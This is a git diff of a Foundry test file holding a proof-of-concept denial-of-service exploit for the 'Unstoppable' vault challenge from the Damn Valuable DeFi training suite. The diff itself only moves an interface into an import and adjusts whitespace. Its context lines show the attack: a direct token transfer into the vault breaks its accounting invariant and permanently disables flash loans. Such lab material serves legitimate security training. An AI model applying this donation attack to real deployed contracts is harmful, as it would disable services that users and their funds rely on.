@@ -4,6 +4,7 @@ pragma solidity ^0.8.0;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../src/DamnValuableToken.sol";
 import {UnstoppableVault} from "../src/UnstoppableVault.sol";
+import {IERC3156FlashBorrower} from "../src/IERC3156.sol";
 import {UnstoppableMonitor} from "../src/UnstoppableMonitor.sol";
 
 contract POC_Unstoppable_DoS is Test {
@@ -63,7 +64,7 @@ contract POC_Unstoppable_DoS is Test {
         
         console.log("Attack successful: flashLoan permanently disabled");
     }
-    
+
     function test_Full_Exploit_Triggers_Monitor() public {
         vm.prank(player);
         token.transfer(address(vault), ATTACK_AMOUNT);
@@ -102,8 +103,4 @@ contract POC_Unstoppable_DoS is Test {
         assertLt(sharesTotalSupply, actualAssets);
         console.log("Invariant VIOLATED: assets > shares");
     }
-}
-
-interface IERC3156FlashBorrower {
-    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32);
 }
